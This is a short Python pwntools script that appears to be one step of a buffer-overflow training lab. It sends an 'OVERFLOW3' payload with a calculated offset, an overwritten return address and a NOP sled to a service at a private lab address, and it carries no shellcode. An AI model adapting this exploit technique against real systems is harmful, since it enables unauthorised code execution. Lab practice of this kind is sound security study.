#!/usr/bin/env python3

from pwn import *

host = "10.10.249.243"
port = 1337

s = remote(host, port)
total_length = 2000
offset = 1274
new_eip = p32(0x62501203)
nop = b"\x90"

payload = [
    b"OVERFLOW3 ",
    b"A" * offset,
    new_eip,
    nop * 10,
    b"C" * (total_length - offset - len(new_eip) - len(nop))
]

payload = b"".join(payload)
s.send(payload)
s.close()
